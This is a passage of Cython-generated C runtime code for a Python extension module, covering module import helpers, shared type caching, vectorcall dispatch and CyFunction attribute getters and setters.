module;\n        }\n        Py_DECREF(spec);\n        Py_DECREF(module);\n    } else if (PyErr_Occurred()) {\n        PyErr_Clear();\n    }\n#endif\n    return __Pyx__ImportDottedModule(name, parts_tuple);\n}\n\n/* ImportFrom */\nstatic PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name) {\n    PyObject* value = __Pyx_PyObject_GetAttrStr(module, name);\n    if (unlikely(!value) && PyErr_ExceptionMatches(PyExc_AttributeError)) {\n        const char* module_name_str = 0;\n        PyObject* module_name = 0;\n        PyObject* module_dot = 0;\n        PyObject* full_name = 0;\n        PyErr_Clear();\n        module_name_str = PyModule_GetName(module);\n        if (unlikely(!module_name_str)) { goto modbad; }\n        module_name = PyUnicode_FromString(module_name_str);\n        if (unlikely(!module_name)) { goto modbad; }\n        module_dot = PyUnicode_Concat(module_name, __pyx_kp_u__6);\n        if (unlikely(!module_dot)) { goto modbad; }\n        full_name = PyUnicode_Concat(module_dot, name);\n        if (unlikely(!full_name)) { goto modbad; }\n        #if PY_VERSION_HEX < 0x030700A1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM  < 0x07030400)\n        {\n            PyObject *modules = PyImport_GetModuleDict();\n            if (unlikely(!modules))\n                goto modbad;\n            value = PyObject_GetItem(modules, full_name);\n        }\n        #else\n        value = PyImport_GetModule(full_name);\n        #endif\n      modbad:\n        Py_XDECREF(full_name);\n        Py_XDECREF(module_dot);\n        Py_XDECREF(module_name);\n    }\n    if (unlikely(!value)) {\n        PyErr_Format(PyExc_ImportError,\n        #if PY_MAJOR_VERSION < 3\n            "cannot import name %.230s", PyString_AS_STRING(name));\n        #else\n            "cannot import name %S", name);\n        #endif\n    }\n    return value;\n}\n\n/* PyObjectCallOneArg */\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {\n    PyObject *args[2] = {NULL, arg};\n    return __Pyx_PyObject_FastCall(func, args+1, 1 | __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET);\n}\n\n/* FixUpExtensionType */\n#if CYTHON_USE_TYPE_SPECS\nstatic int __Pyx_fix_up_extension_type_from_spec(PyType_Spec *spec, PyTypeObject *type) {\n#if PY_VERSION_HEX > 0x030900B1 || CYTHON_COMPILING_IN_LIMITED_API\n    CYTHON_UNUSED_VAR(spec);\n    CYTHON_UNUSED_VAR(type);\n#else\n    const PyType_Slot *slot = spec->slots;\n    while (slot && slot->slot && slot->slot != Py_tp_members)\n        slot++;\n    if (slot && slot->slot == Py_tp_members) {\n        int changed = 0;\n#if !(PY_VERSION_HEX <= 0x030900b1 && CYTHON_COMPILING_IN_CPYTHON)\n        const\n#endif\n            PyMemberDef *memb = (PyMemberDef*) slot->pfunc;\n        while (memb && memb->name) {\n            if (memb->name[0] == \'_\' && memb->name[1] == \'_\') {\n#if PY_VERSION_HEX < 0x030900b1\n                if (strcmp(memb->name, "__weaklistoffset__") == 0) {\n                    assert(memb->type == T_PYSSIZET);\n                    assert(memb->flags == READONLY);\n                    type->tp_weaklistoffset = memb->offset;\n                    changed = 1;\n                }\n                else if (strcmp(memb->name, "__dictoffset__") == 0) {\n                    assert(memb->type == T_PYSSIZET);\n                    assert(memb->flags == READONLY);\n                    type->tp_dictoffset = memb->offset;\n                    changed = 1;\n                }\n#if CYTHON_METH_FASTCALL\n                else if (strcmp(memb->name, "__vectorcalloffset__") == 0) {\n                    assert(memb->type == T_PYSSIZET);\n                    assert(memb->flags == READONLY);\n#if PY_VERSION_HEX >= 0x030800b4\n                    type->tp_vectorcall_offset = memb->offset;\n#else\n                    type->tp_print = (printfunc) memb->offset;\n#endif\n                    changed = 1;\n                }\n#endif\n#else\n                if ((0));\n#endif\n#if PY_VERSION_HEX <= 0x030900b1 && CYTHON_COMPILING_IN_CPYTHON\n                else if (strcmp(memb->name, "__module__") == 0) {\n                    PyObject *descr;\n                    assert(memb->type == T_OBJECT);\n                    assert(memb->flags == 0 || memb->flags == READONLY);\n                    descr = PyDescr_NewMember(type, memb);\n                    if (unlikely(!descr))\n                        return -1;\n                    if (unlikely(PyDict_SetItem(type->tp_dict, PyDescr_NAME(descr), descr) < 0)) {\n                        Py_DECREF(descr);\n                        return -1;\n                    }\n                    Py_DECREF(descr);\n                    changed = 1;\n                }\n#endif\n            }\n            memb++;\n        }\n        if (changed)\n            PyType_Modified(type);\n    }\n#endif\n    return 0;\n}\n#endif\n\n/* FetchSharedCythonModule */\nstatic PyObject *__Pyx_FetchSharedCythonABIModule(void) {\n    PyObject *abi_module = PyImport_AddModule((char*) __PYX_ABI_MODULE_NAME);\n    if (unlikely(!abi_module)) return NULL;\n    Py_INCREF(abi_module);\n    return abi_module;\n}\n\n/* FetchCommonType */\nstatic int __Pyx_VerifyCachedType(PyObject *cached_type,\n                               const char *name,\n                               Py_ssize_t basicsize,\n                               Py_ssize_t expected_basicsize) {\n    if (!PyType_Check(cached_type)) {\n        PyErr_Format(PyExc_TypeError,\n            "Shared Cython type %.200s is not a type object", name);\n        return -1;\n    }\n    if (basicsize != expected_basicsize) {\n        PyErr_Format(PyExc_TypeError,\n            "Shared Cython type %.200s has the wrong size, try recompiling",\n            name);\n        return -1;\n    }\n    return 0;\n}\n#if !CYTHON_USE_TYPE_SPECS\nstatic PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {\n    PyObject* abi_module;\n    const char* object_name;\n    PyTypeObject *cached_type = NULL;\n    abi_module = __Pyx_FetchSharedCythonABIModule();\n    if (!abi_module) return NULL;\n    object_name = strrchr(type->tp_name, \'.\');\n    object_name = object_name ? object_name+1 : type->tp_name;\n    cached_type = (PyTypeObject*) PyObject_GetAttrString(abi_module, object_name);\n    if (cached_type) {\n        if (__Pyx_VerifyCachedType(\n              (PyObject *)cached_type,\n              object_name,\n              cached_type->tp_basicsize,\n              type->tp_basicsize) < 0) {\n            goto bad;\n        }\n        goto done;\n    }\n    if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;\n    PyErr_Clear();\n    if (PyType_Ready(type) < 0) goto bad;\n    if (PyObject_SetAttrString(abi_module, object_name, (PyObject *)type) < 0)\n        goto bad;\n    Py_INCREF(type);\n    cached_type = type;\ndone:\n    Py_DECREF(abi_module);\n    return cached_type;\nbad:\n    Py_XDECREF(cached_type);\n    cached_type = NULL;\n    goto done;\n}\n#else\nstatic PyTypeObject *__Pyx_FetchCommonTypeFromSpec(PyObject *module, PyType_Spec *spec, PyObject *bases) {\n    PyObject *abi_module, *cached_type = NULL;\n    const char* object_name = strrchr(spec->name, \'.\');\n    object_name = object_name ? object_name+1 : spec->name;\n    abi_module = __Pyx_FetchSharedCythonABIModule();\n    if (!abi_module) return NULL;\n    cached_type = PyObject_GetAttrString(abi_module, object_name);\n    if (cached_type) {\n        Py_ssize_t basicsize;\n#if CYTHON_COMPILING_IN_LIMITED_API\n        PyObject *py_basicsize;\n        py_basicsize = PyObject_GetAttrString(cached_type, "__basicsize__");\n        if (unlikely(!py_basicsize)) goto bad;\n        basicsize = PyLong_AsSsize_t(py_basicsize);\n        Py_DECREF(py_basicsize);\n        py_basicsize = 0;\n        if (unlikely(basicsize == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;\n#else\n        basicsize = likely(PyType_Check(cached_type)) ? ((PyTypeObject*) cached_type)->tp_basicsize : -1;\n#endif\n        if (__Pyx_VerifyCachedType(\n              cached_type,\n              object_name,\n              basicsize,\n              spec->basicsize) < 0) {\n            goto bad;\n        }\n        goto done;\n    }\n    if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;\n    PyErr_Clear();\n    CYTHON_UNUSED_VAR(module);\n    cached_type = __Pyx_PyType_FromModuleAndSpec(abi_module, spec, bases);\n    if (unlikely(!cached_type)) goto bad;\n    if (unlikely(__Pyx_fix_up_extension_type_from_spec(spec, (PyTypeObject *) cached_type) < 0)) goto bad;\n    if (PyObject_SetAttrString(abi_module, object_name, cached_type) < 0) goto bad;\ndone:\n    Py_DECREF(abi_module);\n    assert(cached_type == NULL || PyType_Check(cached_type));\n    return (PyTypeObject *) cached_type;\nbad:\n    Py_XDECREF(cached_type);\n    cached_type = NULL;\n    goto done;\n}\n#endif\n\n/* PyVectorcallFastCallDict */\n#if CYTHON_METH_FASTCALL\nstatic PyObject *__Pyx_PyVectorcall_FastCallDict_kw(PyObject *func, __pyx_vectorcallfunc vc, PyObject *const *args, size_t nargs, PyObject *kw)\n{\n    PyObject *res = NULL;\n    PyObject *kwnames;\n    PyObject **newargs;\n    PyObject **kwvalues;\n    Py_ssize_t i, pos;\n    size_t j;\n    PyObject *key, *value;\n    unsigned long keys_are_strings;\n    Py_ssize_t nkw = PyDict_GET_SIZE(kw);\n    newargs = (PyObject **)PyMem_Malloc((nargs + (size_t)nkw) * sizeof(args[0]));\n    if (unlikely(newargs == NULL)) {\n        PyErr_NoMemory();\n        return NULL;\n    }\n    for (j = 0; j < nargs; j++) newargs[j] = args[j];\n    kwnames = PyTuple_New(nkw);\n    if (unlikely(kwnames == NULL)) {\n        PyMem_Free(newargs);\n        return NULL;\n    }\n    kwvalues = newargs + nargs;\n    pos = i = 0;\n    keys_are_strings = Py_TPFLAGS_UNICODE_SUBCLASS;\n    while (PyDict_Next(kw, &pos, &key, &value)) {\n        keys_are_strings &= Py_TYPE(key)->tp_flags;\n        Py_INCREF(key);\n        Py_INCREF(value);\n        PyTuple_SET_ITEM(kwnames, i, key);\n        kwvalues[i] = value;\n        i++;\n    }\n    if (unlikely(!keys_are_strings)) {\n        PyErr_SetString(PyExc_TypeError, "keywords must be strings");\n        goto cleanup;\n    }\n    res = vc(func, newargs, nargs, kwnames);\ncleanup:\n    Py_DECREF(kwnames);\n    for (i = 0; i < nkw; i++)\n        Py_DECREF(kwvalues[i]);\n    PyMem_Free(newargs);\n    return res;\n}\nstatic CYTHON_INLINE PyObject *__Pyx_PyVectorcall_FastCallDict(PyObject *func, __pyx_vectorcallfunc vc, PyObject *const *args, size_t nargs, PyObject *kw)\n{\n    if (likely(kw == NULL) || PyDict_GET_SIZE(kw) == 0) {\n        return vc(func, args, nargs, NULL);\n    }\n    return __Pyx_PyVectorcall_FastCallDict_kw(func, vc, args, nargs, kw);\n}\n#endif\n\n/* CythonFunctionShared */\n#if CYTHON_COMPILING_IN_LIMITED_API\nstatic CYTHON_INLINE int __Pyx__IsSameCyOrCFunction(PyObject *func, void *cfunc) {\n    if (__Pyx_CyFunction_Check(func)) {\n        return PyCFunction_GetFunction(((__pyx_CyFunctionObject*)func)->func) == (PyCFunction) cfunc;\n    } else if (PyCFunction_Check(func)) {\n        return PyCFunction_GetFunction(func) == (PyCFunction) cfunc;\n    }\n    return 0;\n}\n#else\nstatic CYTHON_INLINE int __Pyx__IsSameCyOrCFunction(PyObject *func, void *cfunc) {\n    return __Pyx_CyOrPyCFunction_Check(func) && __Pyx_CyOrPyCFunction_GET_FUNCTION(func) == (PyCFunction) cfunc;\n}\n#endif\nstatic CYTHON_INLINE void __Pyx__CyFunction_SetClassObj(__pyx_CyFunctionObject* f, PyObject* classobj) {\n#if PY_VERSION_HEX < 0x030900B1 || CYTHON_COMPILING_IN_LIMITED_API\n    __Pyx_Py_XDECREF_SET(\n        __Pyx_CyFunction_GetClassObj(f),\n            ((classobj) ? __Pyx_NewRef(classobj) : NULL));\n#else\n    __Pyx_Py_XDECREF_SET(\n        ((PyCMethodObject *) (f))->mm_class,\n        (PyTypeObject*)((classobj) ? __Pyx_NewRef(classobj) : NULL));\n#endif\n}\nstatic PyObject *\n__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, void *closure)\n{\n    CYTHON_UNUSED_VAR(closure);\n    if (unlikely(op->func_doc == NULL)) {\n#if CYTHON_COMPILING_IN_LIMITED_API\n        op->func_doc = PyObject_GetAttrString(op->func, "__doc__");\n        if (unlikely(!op->func_doc)) return NULL;\n#else\n        if (((PyCFunctionObject*)op)->m_ml->ml_doc) {\n#if PY_MAJOR_VERSION >= 3\n            op->func_doc = PyUnicode_FromString(((PyCFunctionObject*)op)->m_ml->ml_doc);\n#else\n            op->func_doc = PyString_FromString(((PyCFunctionObject*)op)->m_ml->ml_doc);\n#endif\n            if (unlikely(op->func_doc == NULL))\n                return NULL;\n        } else {\n            Py_INCREF(Py_None);\n            return Py_None;\n        }\n#endif\n    }\n    Py_INCREF(op->func_doc);\n    return op->func_doc;\n}\nstatic int\n__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, void *context)\n{\n    CYTHON_UNUSED_VAR(context);\n    if (value == NULL) {\n        value = Py_None;\n    }\n    Py_INCREF(value);\n    __Pyx_Py_XDECREF_SET(op->func_doc, value);\n    return 0;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, void *context)\n{\n    CYTHON_UNUSED_VAR(context);\n    if (unlikely(op->func_name == NULL)) {\n#if CYTHON_COMPILING_IN_LIMITED_API\n        op->func_name = PyObject_GetAttrString(op->func, "__name__");\n#elif PY_MAJOR_VERSION >= 3\n        op->func_name = PyUnicode_InternFromString(((PyCFunctionObject*)op)->m_ml->ml_name);\n#else\n        op->func_name = PyString_InternFromString(((PyCFunctionObject*)op)->m_ml->ml_name);\n#endif\n        if (unlikely(op->func_name == NULL))\n            return NULL;\n    }\n    Py_INCREF(op->func_name);\n    return op->func_name;\n}\nstatic int\n__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, void *context)\n{\n    CYTHON_UNUSED_VAR(context);\n#if PY_MAJOR_VERSION >= 3\n    if (unlikely(value == NULL || !PyUnicode_Check(value)))\n#else\n    if (unlikely(value == NULL || !PyString_Check(value)))\n#endif\n    {\n        PyErr_SetString(PyExc_TypeError,\n                        "__name__ must be set to a string object");\n        return -1;\n    }\n    Py_INCREF(value);\n    __Pyx_Py_XDECREF_SET(op->func_name, value);\n    return 0;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject *op, void *context)\n{\n    CYTHON_UNUSED_VAR(context);\n    Py_INCREF(op->func_qualname);\n    return op->func_qualname;\n}\nstatic int\n__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, void *context)\n{\n    CYTHON_UNUSED_VAR(context);\n#if PY_MAJOR_VERSION >= 3\n    if (unlikely(value == NULL || !PyUnicode_Check(value)))\n#else\n    if (unlikely(value == NULL || !PyString_Check(value)))\n#endif\n    {\n        PyErr_SetString(PyExc_TypeError,\n                        "__qualname__ must be set to a string object");\n        return -1;\n    }\n    Py_INCREF(value);\n    __Pyx_Py_XDECREF_SET(op->func_qualname, value);\n    return 0;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, void *context)\n{\n    CYTHON_UNUSED_VAR(context);\n    if (unlikely(op->func_dict == NULL)) {\n        op->func_dict = PyDict_New();\n        if (unlikely(op->func_dict == NULL))\n            return NULL;\n    }\n    Py_INCREF(op->func_dict);\n    return op->func_dict;\n}\nstatic int\n__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, void *context)\n{\n    CYTHON_UNUSED_VAR(context);\n    if (unlikely(value == NULL)) {\n        PyErr_SetString(PyExc_TypeError,\n               "function\'s dictionary may not be deleted");\n        return -1;\n    }\n    if (unlikely(!PyDict_Check(value))) {\n        PyErr_SetString(PyExc_TypeError,\n               "setting function\'s dictionary to a non-dict");\n        return -1;\n    }\n    Py_INCREF(value);\n    __Pyx_Py_XDECREF_SET(op->func_dict, value);\n    return 0;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, void *context)\n{\n    CYTHON_UNUSED_VAR(context);\n    Py_INCREF(op->func_globals);\n    return op->func_globals;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_closure(__pyx_CyFunctionObject *op, void *context)\n{\n    CYTHON_UNUSED_VAR(op);\n    CYTHON_UNUSED_VAR(context);\n    Py_INCREF(Py_None);\n    return Py_None;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, void *context)\n{\n    PyObject* result = (op->func_code) ? op->func_code : Py_None;\n    CYTHON_UNUSED_VAR(context);\n    Py_INCREF(result);\n    return result;\n}\nstatic int\n__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {\n    int result = 0;\n    PyObject *res = op->defaults_getter((PyObject *) op);\n    if (unlikely(!res))\n        return -1;\n    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);\n    Py_INCREF(op->defaults_tuple);\n    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);\n    Py_INCREF(op->defaults_kwdict);\n    #else\n    op->defaults_tuple = __Pyx_PySequence_ITEM(res, 0);\n    if (unlikely(!op->defaults_tuple)) result = -1;\n    else {\n        op->defaults_kwdict = __Pyx_PySequence_ITEM(res, 1);\n        if (unlikely(!op->defaults_kwdict)) result = -1;\n    }\n    #endif\n    Py_DECREF(res);\n    return result;\n}\nstatic int\n__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, void *context) {\n    CYTHON_UNUSED_VAR(context);\n    if (!value) {\n        value = Py_None;\n    } else if (unlikely(value != Py_None && !PyTuple_Check(value))) {\n        PyErr_SetString(PyExc_TypeError,\n                        "__defaults__ must be set to a tuple object");\n        return -1;\n    }\n    PyErr_WarnEx(PyExc_RuntimeWarning, "changes to cyfunction.__defaults__ will not "\n                 "currently affect the values used in function calls", 1);\n    Py_INCREF(value);\n    __Pyx_Py_XDECREF_SET(op->defaults_tuple, value);\n    return 0;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, void *context) {\n    PyObject* result = op->defaults_tuple;\n    CYTHON_UNUSED_VAR(context);\n    if (unlikely(!result)) {\n        if (op->defaults_getter) {\n            if (unlikely(__Pyx_CyFunction_init_defaults(op) < 0)) return NULL;\n            result = op->defaults_tuple;\n        } else {\n            result = Py_None;\n        }\n    }\n    Py_INCREF(result);\n    return result;\n}\nstatic int\n__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, void *context) {\n    CYTHON_UNUSED_VAR(context);\n    if (!value) {\n        value = Py_None;\n    } else if (unlikely(value != Py_None && !PyDict_Check(value))) {\n        PyErr_SetString(PyExc_TypeError,\n                        "__kwdefaults__ must be set to a dict object");\n        return -1;\n    }\n    PyErr_WarnEx(PyExc_RuntimeWarning, "changes to cyfunction.__kwdefaults__ will not "\n                 "currently affect the values used in function calls", 1);\n    Py_INCREF(value);\n    __Pyx_Py_XDECREF_SET(op->defaults_kwdict, value);\n    return 0;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, void *context) {\n    PyObject* result = op->defaults_kwdict;\n    CYTHON_UNUSED_VAR(context);\n    if (unlikely(!result)) {\n        if (op->defaults_getter) {\n            if (unlikely(__Pyx_CyFunction_init_defaults(op) < 0)) return NULL;\n            result = op->defaults_kwdict;\n        } else {\n            result = Py_None;\n        }\n    }\n    Py_INCREF(result);\n    return result;\n}\nstatic int\n__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, void *context) {\n    CYTHON_UNUSED_VAR(context);\n    if (!value || value == Py_None) {\n        value = NULL;\n    } else if (unlikely(!PyDict_Check(value))) {\n        PyErr_SetString(PyExc_TypeError,\n                        "__annotations__ must be set to a dict object");\n        return -1;\n    }\n    Py_XINCREF(value);\n    __Pyx_Py_XDECREF_SET(op->func_annotations, value);\n    return 0;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, void *context) {\n    PyObject* result = op->func_annotations;\n    CYTHON_UNUSED_VAR(context);\n    if (unlikely(!result)) {\n        result = PyDict_New();\n        if (unlikely(!result)) return NULL;\n        op->func_annotations = result;\n    }\n    Py_INCREF(result);\n    return result;\n}\nstatic PyObject *\n__Pyx_CyFunction_get_is_coroutine(__pyx_CyFunctionObject *op, void *context) {\n    int is_coroutine;\n    CYTHON_UNUSED_VAR(context);\n    if (op->func_is_coroutine) {\n        return __Pyx_NewRef(op->func_is_coroutine);\n    }\n    is_coroutine = op->flags & __Pyx_CYFUNCTION_COROUTINE;\n#if PY_VERSION_HEX >= 0x03050000\n    if (is_coroutine) {\n        PyObject *module, *fromlist, *marker = __pyx_n_s_is_coroutine;\n        fromlist = PyList_New(1);\n        if (unlikely(!fromlist)) return NULL;\n        Py_INCREF(marker);\n#if CYTHON_ASSUME_SAFE_MACROS\n        PyList_SET_ITEM(fromlist, 0, marker);\n#else\n        if (unlikely(PyList_SetItem(fromlist, 0, marker) < 0)) {\n            Py_DECREF(marker);\n            Py_DECREF(fromlist);\n            return NULL;\n        }\n#endif\n        module = PyImport_ImportModuleLevelObject(__pyx_n_s_asyncio_coroutines, NULL, NULL, fromlist, 0);\n        Py_DECREF(fromlist);\n        if (unlikely(!module)) goto ignore;\n        op->func_is_coroutine = __Pyx_PyObject_GetAttrStr(module, marker);\n        Py_DECREF(module);\n        if (likely(op->func_is_coroutine)) {\n            return __Pyx_NewRef(op->func_is_coroutine);\n        }\nignore:\n        PyErr_Clear();\n    }\n#endif\n    op->func_is_coroutine = __Pyx_PyBool_FromLong(is_coroutine);\n    return __Pyx_NewRef(op->func_is_coroutine);\n}\n#if CYTHON_COMPILING_IN_LIMITED_API\nstatic PyObject *\n__Pyx_CyFunction_get_module(__pyx_CyFunctionObject *op, void *context) {\n    CYTHON_UNUSED_VAR(context);\n    return PyObject_GetAttrString(op->func, "__module__");\n}\nstatic int\n__Pyx_CyFunction_set_module(__pyx_CyFunctionObject *op, PyObject* value, void *context) {\n    CYTHON_UNUSED_VAR(context);\n    return PyObject_SetAttrString(op->func, "__module__", value);\n}\n#endif\nstatic PyGetSetDef __pyx_CyFunction_getsets[] = {\n    {(char *) "func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},\n    {(char *) "__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},\n    {(char *) "func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},\n    {(char *) "__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},\n    {(char *) "__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},\n    {(char *) "func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},\n    {(char *) "__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},\n    {(char *) "func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},\n    {(char *) "__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},\n    {(char *) "func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},\n    {(char *) "__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},\n    {(char *) "func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},\n    {(char *) "__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},\n    {(char *) "func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},\n    {(char *) "__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},\n    {(char *) "__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},\n    {(char *) "__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},\n    {(char *) "_is_coroutine", (getter)__Pyx_CyFunction_get_is_coroutine, 0, 0, 0},\n#if CYTHON_COMPILING_IN_LIMITED_API\n    {"__module__", (getter)__Pyx_CyFunction_get_module, (setter)__Pyx_CyFunction_set_module, 0, 0},\n#endif\n    {0, 0, 0, 0, 0}\n};\nstatic PyMemberDef __pyx_CyFunction_members[] = {\n#if !CYTHON_COMPILING_IN_LIMITED_API\n    {(char *) "__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), 0, 0},\n#endif\n#if CYTHON_USE_TYPE_SPECS\n    {(char *) "__dictoffset__", T_PYSSIZET, offsetof(__pyx_CyFunctionObject, func_dict), READONLY, 0},\n#if CYTHON_METH_FASTCALL\n#if CYTHON_BACKPORT_VECTORCALL\n    {(char *) "__vectorcalloffset__", T_PYSSIZET, offsetof(__pyx_CyFunctionObject, func_vectorcall), READONLY, 0},\n#else\n#if !CYTHON_COMPILING_IN_LIMITED_API\n    {(char *) "__vectorcalloffset__", T_PYSSIZET, offsetof(PyCFunctionObject, vectorcall), READONLY, 0},\n#endif\n#endif\n#endif\n#if PY_VERSION_HEX < 0x030500A0 || CYTHON_COMPILING_IN_LIMITED_API\n    {(char *) "__weaklistoffset__", T_PYSSIZET, offsetof(__pyx_CyFunctionObject, func_weakreflist), READONLY, 0},\n#else\n    {(char *) "__weaklistoffset__", T_PYSSIZET, offsetof(PyCFunctionObject, m_weakreflist), READONLY, 0},\n#endif\n#endif\n    {0, 0, 0,  0, 0}\n};\nstatic PyObject *\n__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, PyObject *args)\n{\n    CYTHON_UNUSED_VAR(args);\n#if PY_MAJOR_VERSION >= 3\n    Py_INCREF(m->func_qualname);\n    return m->func_qualname;\n#else\n    return PyString_FromString(((PyCFunctionObject*)m)->m_ml->ml_name);\n#endif\n}\nstatic PyMethodDef __pyx_CyFunction_methods[] = {\n    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},\n    {0, 0, 0, 0}\n};\n#if PY_VERSION_HEX < 0x030500A0 || CYTHON_COMPILING_IN_LIMITED_API\n#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)\n#else\n#define __Pyx_CyFunction_weakreflist(cyfunc) (((PyCFunctionObject*)cyfunc)->m_weakreflist)\n#endif\nstatic PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,\n                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {\n#if !CYTHON_COMPILING_IN_LIMITED_API\n    PyCFunctionObject *cf = (PyCFunctionObject*) op;\n#endif\n    if (unlikely(op == NULL))\n        return NULL;\n#if CYTHON_COMPILING_IN_LIMITED_API\n    op->func = PyCFunction_NewEx(ml, (PyObject*)op, module);\n    if (unlikely(!op->func)) return NULL;\n#endif\n    op->flags = flags;\n    __Pyx_CyFunction_weakreflist(op) = NULL;\n#if !CYTHON_COMPILING_IN_LIMITED_API\n    cf->m_ml = ml;\n    cf->m_self = (PyObject *) op;\n#endif\n    Py_XINCREF(closure);\n    op->func_closure = closure;\n#if !CYTHON_COMPILING_IN_LIMITED_API\n    Py_XINCREF(module);\n    cf->m_module = module;\n#endif\n    op->func_dict = NULL;\n    op->func_name = NULL;\n    Py_INCREF(qualname);\n    op->func_qualname = qualname;\n    op->func_doc = NULL;\n#if PY_VERSION_HEX < 0x030900B1 || CYTHON_COMPILING_IN_LIMITED_API\n    op->func_classobj = NULL;\n#else\n    ((PyCMethodObject*)op)->mm_class = NULL;\n#endif\n    op->func_globals = globals;\n    Py_INCREF(op->func_globals);\n    Py_XINCREF(code);\n    op->func_code = code;\n    op->defaults_pyobjects = 0;\n    op->defaults_size = 0;\n    op->defaults = NULL;\n    op->defaults_tuple = NULL;\n    op->defaults_kwdict = NULL;\n    op->defaults_getter = NULL;\n    op->func_annotations = NULL;\n    op->func_is_coroutine = NULL;\n#if CYTHON_METH_FASTCALL\n    switch (ml->ml_flags & (METH_VARARGS | METH_FASTCALL | METH_NOARGS | METH_O | METH_KEYWORDS | METH_METHOD)) {\n    case METH_NOARGS:\n        __Pyx_CyFunction_func_vectorcall(op) = __Pyx_CyFunction_Vectorcall_NOARGS;\n        break;\n    case METH_O:\n        __Pyx_CyFunction_func_vectorcall(op) = __Pyx_CyFunction_Vectorcall_O;\n        break;\n    case METH_METHOD | METH_FASTCALL | METH_KEYWORDS:\n        __Pyx_CyFunction_func_vectorcall(op) = __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS_METHOD;\n        break;\n    case METH_FASTCALL | METH_KEYWORDS:\n        __Pyx_CyFunction_func_vectorcall(op) = __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS;\n        break;\n    case METH_VARARGS | METH_KEYWORDS:\n        __Pyx_CyFunction_func_vectorcall(op) = NULL;\n        break;\n    default:\n        PyErr_SetString(PyExc_SystemError, "Bad call flags for CyFunction");\n        Py_DECREF(op);\n        return NULL;\n    }\n#endif\n    return (PyObject *) op;\n}\nstatic int\n__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)\n{\n    Py_CLEAR(m->func_closure);\n#if CYTHON_COMPILING_IN_LIMITED_API\n    Py_CLEAR(m->func);\n#else\n    Py_CLEAR(((PyCFunctionObject*)m)->m_module);\n#endif\n    Py_CLEAR(m->func_dict);\n    Py_CLEAR(m->func_name);\n    Py_CLEAR(m->func_qualname);\n    Py_CLEAR(m->func_doc);\n    Py_CLEAR(m->func_globals);\n    Py_CLEAR(m->func_code);\n#if !CYTHON_COMPILING_IN_LIMITED_API\n#if PY_VERSION_HEX < 0x030900B1\n    Py_CLEAR(__Pyx_CyFunction_GetClassObj(m));\n#else\n    {\n        PyObject *cls = (PyObject*) ((PyCMethodObject *) (m))->mm_class;\n        ((PyCMethodObject *) 